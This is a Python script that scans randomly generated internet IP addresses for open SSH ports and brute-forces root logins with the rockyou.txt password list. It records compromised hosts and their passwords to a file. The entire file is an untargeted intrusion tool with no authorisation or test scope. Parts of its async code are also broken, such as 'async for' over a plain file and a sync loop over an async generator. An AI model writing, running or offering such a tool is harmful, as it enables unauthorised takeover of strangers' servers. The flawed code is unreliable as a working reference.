import random
import socket
import paramiko
import os
import asyncio

async def generate_passwords(passwords_file):
    with open(passwords_file, 'r', encoding='latin-1') as f:
        async for password in f:
            yield password.strip()

async def is_ssh_port_open(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, 22))
        if result == 0:
            return True
        else:
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    finally:
        sock.close()

async def ssh_connect(ip, username, password):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=5)
        client.close()
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except paramiko.ssh_exception.SSHException:
        return False
    except socket.error:
        return False

async def scan_host(ip, passwords):
    if await is_ssh_port_open(ip):
        print(f"\rScanning IP: {ip} - SSH port is open. Starting cracking process...", end='', flush=True)
        for password in passwords:
            if await ssh_connect(ip, 'root', password):
                print(f"\nRoot login successful on IP: {ip} with password: {password}")
                with open('successful_ips.txt', 'a') as f:
                    f.write(f"Root login successful on IP: {ip} with password: {password}\n")
                break
            else:
                print(f"\rFailed to login to {ip} with password: {password}", end='', flush=True)
    else:
        print(f"\rScanning IP: {ip} - SSH port is closed. Skipping...            ", end='', flush=True)

async def main():
    passwords_file = 'rockyou.txt'
    passwords = generate_passwords(passwords_file)
    tried_ips_file = 'tried_ips.log'
    tried_ips = set()

    if os.path.exists(tried_ips_file):
        with open(tried_ips_file, 'r') as f:
            tried_ips.update(f.read().splitlines())

    while True:
        ip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
        if ip not in tried_ips:
            tried_ips.add(ip)
            with open(tried_ips_file, 'a') as f:
                f.write(ip + '\n')
            await scan_host(ip, passwords)